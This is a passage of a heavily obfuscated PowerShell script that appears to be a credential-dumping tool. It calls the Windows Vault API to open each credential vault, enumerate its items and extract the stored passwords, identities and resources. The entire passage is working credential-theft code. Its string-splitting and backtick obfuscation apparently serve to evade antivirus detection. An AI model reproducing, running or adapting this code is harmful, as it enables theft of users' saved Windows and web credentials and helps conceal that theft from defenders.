        ([Guid] ("{3}{2}{4}{1}{5}{0}{6}"-f'73-','3E7-','0E35BE-1B','3E','77-4','B8','AED901B6275B')) = ("{5}{2}{1}{6}{3}{4}{0}{7}{8}" -f 'n','Domain Pas',' ','wor','d Crede','Windows','s','tia','l')
        ([Guid] ("{1}{4}{6}{5}{0}{2}{3}" -f'669-4AA2-A8','3C8','FB-3F6','759A77548','86','3-2','FF')) = ("{5}{4}{2}{0}{1}{6}{3}" -f'nde','d Cre','te','ial','Ex','Windows ','dent')
        ([Guid] ("{1}{3}{7}{5}{4}{6}{8}{9}{0}{2}" -f '00','000','00','000','00-00','-00','00-0000-','00','0','0000000')) = ${n`Ull}
    }

    if (${vAuLt`co`UnT})
    {
        foreach (${i} in 1..${VAu`lt`cO`UnT})
        {
            ${vault`Gu`ID} =   ( &("{0}{2}{1}"-f 'va','Able','ri') ('79'+'6') -valu  )::"pTR`T`OsTRuctU`RE"(${guIdAdd`RE`ss}, [Type] [Guid])
            ${Gu`IDad`d`ReSs} = [IntPtr] (${GuiDa`dd`R`ess}.("{0}{1}"-f'ToInt6','4').Invoke() +  ${7`96}::"siZ`eOf"([Type] [Guid]))

            ${V`AU`l`THandLe} =  (&("{0}{2}{3}{1}" -f'get','lE','-vARia','B')  ("{1}{0}"-f'7NI9','r')  )."v`ALUE"::"z`eRo"

            &("{3}{0}{2}{1}" -f 'rite','Verbose','-','W') "Opening vault - $($VaultSchema[$VaultGuid]) ($($VaultGuid)) "

            ${RESU`lt} = ${vA`Ult`ClI}::"V`AULtop`En`VAu`Lt"([Ref] ${VAUL`T`Guid}, 0, [Ref] ${VA`Ul`Than`dLe})

            if (${R`ES`ULt} -ne 0)
            {
                &("{2}{0}{1}" -f'i','te-Error','Wr') "Unable to open the following vault: $($VaultSchema[$VaultGuid]). Error (0x$($Result.ToString('X8'))) "
                continue
            }

            ${VaulT`Ite`m`CO`UNt} = 0
            ${vAuLTIt`E`MPTR} =   (&("{0}{3}{1}{2}"-f 'geT-cH','LdiT','Em','i')  ("{0}{1}{2}{3}"-f 'vARiA','BlE',':r','7nI9') )."v`AluE"::"zE`RO"

            ${R`ES`ULt} = ${Va`ULt`cLi}::"vauL`T`ENU`MeR`ATeITeMs"(${vau`lt`h`AndlE}, 512, [Ref] ${Vau`lTIteMCoU`Nt}, [Ref] ${VA`UlTI`TEMpTR})

            if (${R`e`Sult} -ne 0)
            {
                ${NU`Ll} = ${VaULtc`lI}::"vA`UL`TCl`oS`EVAuLT"([Ref] ${VA`ULTh`An`DLe})
                &("{2}{0}{1}" -f '-','Error','Write') "Unable to enumerate vault items from the following vault: $($VaultSchema[$VaultGuid]). Error (0x$($Result.ToString('X8'))) "
                continue
            }

            ${s`T`RUct`ADdre`Ss} = ${Va`Ul`TiTEM`P`TR}

            if (${vAuLTI`Te`MCOU`Nt})
            {
                foreach (${j} in 1..${v`AuLTi`TeMcoU`Nt})
                {
                    ${CU`R`RenT`ITEM} =  ( &("{0}{1}{2}{3}"-f'g','ET-','VaRi','aBlE')  796 )."VA`lUe"::"PTRToSt`RUc`Tu`RE"(${STrUC`TaDDRE`ss}, [Type] ${vAulT`_i`TeM})
                    ${S`Tr`Ucta`DDRe`sS} = [IntPtr] (${s`TrUctADdR`e`sS}.("{1}{2}{0}" -f'Int64','T','o').Invoke() +   (  &("{3}{0}{2}{1}"-f 'Et-VaR','ABle','i','G') ("79"+"6")  -valuEonLY )::"Si`Zeof"([Type] ${VA`U`Lt_ITEm}))

                    ${PAS`sWoR`d`VAuLtI`TEm} =  ${r7`NI9}::"z`erO"

                    if (${osm`Aj`oR} -ge 6 -and ${oSmI`N`or} -ge 2)
                    {
                        ${rE`SUlt} = ${vAu`LT`C`lI}::("{2}{0}{1}{3}" -f'ultGet','I','Va','tem').Invoke(${vaUl`THaN`DLe},
                                                          [Ref] ${C`UrreN`TitEM}."s`cH`emaiD",
                                                          ${cuRren`TI`TEM}."p`Re`So`URC`eelEmENt",
                                                          ${cURr`eNti`Tem}."PI`dE`NT`It`YELeMeNT",
                                                          ${CU`Rr`En`TItEm}."PPaCka`G`eS`iD",
                                                            (  &("{0}{1}{2}" -f 'c','HILD','ITEm')  ("v"+"arIaB"+"lE:R7"+"n"+"i9"))."V`ALUe"::"Z`ero",
                                                          0,
                                                          [Ref] ${PasSwO`RD`V`AUlTITEM})
                    }
                    else
                    {
                        ${reSu`lt} = ${v`Aultc`lI}::("{1}{3}{0}{2}"-f'Ite','Vault','m','Get').Invoke(${V`AU`ltHAnD`Le},
                                                          [Ref] ${CuRrE`N`TitEM}."SCHe`MA`iD",
                                                          ${Cu`R`Re`NtitEM}."PREsOURCE`E`lEm`e`Nt",
                                                          ${CuRR`ENT`I`TeM}."PidEnT`I`Ty`EleME`NT",
                                                            (&("{2}{1}{0}"-f 'EM','Et-iT','G')  ("{1}{0}{3}{2}"-f'BlE:','VaRiA','7nI9','R')  )."vAL`Ue"::"Ze`RO",
                                                          0,
                                                          [Ref] ${PASswor`dV`Au`Lt`ItEm})
                    }

                    ${Pas`sw`OrdITEM} = ${nU`ll}

                    if (${re`su`lt} -ne 0)
                    {
                        &("{1}{3}{0}{2}"-f'ro','Writ','r','e-Er') "Error occured retrieving vault item. Error (0x$($Result.ToString('X8'))) "
                        continue
                    }
                    else
                    {
                        ${paSswOrD`I`Tem} =  (&("{0}{1}{2}"-f'cHI','L','DiTem') ("{0}{2}{1}{3}" -f 'VA','9','rIaBlE:7','6')  )."vA`lUE"::"PtrtoStRuc`T`URE"(${PassWoR`dvaU`lt`ITeM}, [Type] ${Va`Ul`T_`ITeM})
                    }

                    if (${V`AUl`Ts`chema}.("{2}{0}{1}" -f'ont','ainsKey','C').Invoke(${va`UltGu`Id}))
                    {
                        ${V`AuLt`T`yPE} = ${v`A`UlTS`CHeMa}[${Va`ULTg`U`id}]
                    }
                    else
                    {
                        ${V`AULTt`ype} = ${V`Aul`Tguid}
                    }

                    if (${PASsW`oRdI`Tem}."pA`UThE`N`TIcat`oreLEM`Ent" -ne  ( &("{1}{2}{0}"-f'iablE','v','aR') ('R7nI'+'9')  -vAl )::"z`erO")
                    {
                        ${cR`edEn`T`IAl} = &("{2}{3}{1}{4}{0}" -f'entValue','l','Get-Vault','E','em') ${paS`SWo`RDiTeM}."PA`U`THEN`TICaTO`REl`eMENt"
                    }
                    else
                    {
                        ${CRe`DENT`i`Al} = ${Nu`Ll}
                    }

                    ${P`AckaGe`SId} = ${N`ULl}

                    if (${C`URrE`NTITeM}."Pp`AckAG`EsiD" -and (${cuR`R`Ent`itEm}."p`p`AckAG`eSId" -ne  ( &("{0}{1}" -f 'di','R')  ('VarI'+'AB'+'le:R7'+'NI9'))."V`AlUe"::"Z`eRO"))
                    {
                        ${PAcK`Ag`eS`Id} = &("{5}{1}{2}{4}{0}{3}"-f 'a','-VaultElem','en','lue','tV','Get') ${C`UrreNT`It`EM}."PP`AC`kaGe`SID"
                    }


                    ${PR`op`ERtiEs} = @{
                        ("{1}{0}" -f'lt','Vau') = ${vaULtT`Y`Pe}
                        ("{1}{0}" -f'e','Resourc') = if (${C`URR`eNTi`Tem}."P`R`esouRCeeL`eMEnt") { &("{5}{4}{2}{0}{3}{1}" -f 'Element','lue','Vault','Va','-','Get') ${CURr`E`NT`Item}."PRESoUr`Ce`El`eMeNt" } else { ${N`UlL} }
                        ("{2}{1}{0}"-f'y','tit','Iden') = if (${CURRenTi`T`em}."p`ideNtI`T`YelEmEnT") { &("{5}{1}{4}{6}{2}{0}{3}" -f 'lementVal','t-V','E','ue','au','Ge','lt') ${C`URR`EnTit`eM}."PIdeNti`TY`eLe`meNT" } else { ${Nu`lL} }
                        ("{2}{1}{0}{3}"-f 'ag','ack','P','eSid') = ${P`AcKa`GE`Sid}
                        ("{0}{1}{2}" -f 'Cred','entia','l') = ${cr`eDenT`iAL}
                        ("{2}{0}{1}" -f 'astMo','dified','L') =  ( &("{3}{0}{2}{1}"-f't-','dITEm','cHil','GE') ("VaR"+"iaBL"+"e:H95")  )."v`ALue"::("{1}{0}{3}{2}{4}" -f 'eT','FromFil','U','ime','tc').Invoke(${C`URRe`NtI`TeM}."LAS`TmO`DiFIed")
                    }

                    ${VaU`l`TIteM} = &("{2}{0}{1}" -f'bj','ect','New-O') ("{1}{2}{0}"-f'ect','P','SObj') -Property ${prope`RTI`es}
                    ${VaULt`I`Tem}."PS`oBJe`ct"."ty`pen`Ames"[0] = ("{4}{2}{0}{1}{3}"-f 'VAULT','ITE','CLI.','M','VAULT')

                    ${v`A`ULTIt`em}

                    ${NU`Ll} = ${VA`Ult`cLi}::("{1}{2}{0}"-f 'tFree','Vau','l').Invoke(${PaS`SW`Or`dVau`l`TItem})
                }
            }

            ${NU`ll} = ${vA`Ult`cLi}::"vaul`Tc`LO`SEVa`ULt"([Ref] ${V`AU`lthAnDLE})
        }
    }
}